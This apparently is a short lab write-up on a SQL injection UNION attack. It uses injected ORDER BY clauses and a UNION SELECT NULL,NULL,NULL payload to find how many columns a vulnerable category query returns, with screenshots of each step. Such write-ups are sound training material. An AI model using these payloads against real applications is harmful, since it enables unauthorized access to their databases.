## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234031666-c94aaafc-91c3-4979-91c9-4e55bd75ab9a.png)


## Solution :

![image](https://user-images.githubusercontent.com/67383098/234045690-4050d5b2-cef2-48ef-bd94-1c6b0866ac7f.png)

Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

We craft the request by adding **UNION** along with **ORDER BY** clause to *find the number of columns that is being used by the query*.

**ORDER BY 1**

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 1 --
```

![image](https://user-images.githubusercontent.com/67383098/234046970-f6f0da55-cb48-478e-9088-df25a925aad3.png)

**ORDER BY 2**

![image](https://user-images.githubusercontent.com/67383098/234047295-1c5ba413-82e5-4e31-b102-f9c20857c1ef.png)

**ORDER BY 3**

![image](https://user-images.githubusercontent.com/67383098/234047153-85014d4b-77a8-47be-aec0-89dcdcf3002f.png)

**ORDER BY 4**

![image](https://user-images.githubusercontent.com/67383098/234047479-299a04ae-d465-4aa9-afe7-01982add7479.png)

This throws an error. It means that there are 3 columns that is being retreived in the query by the web application.

Now as per our given question, we use **UNION SELECT NULL** payload to return an additional column that contains null values.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234049783-5e934a05-413b-4041-b355-a22f15be9cb1.png)









































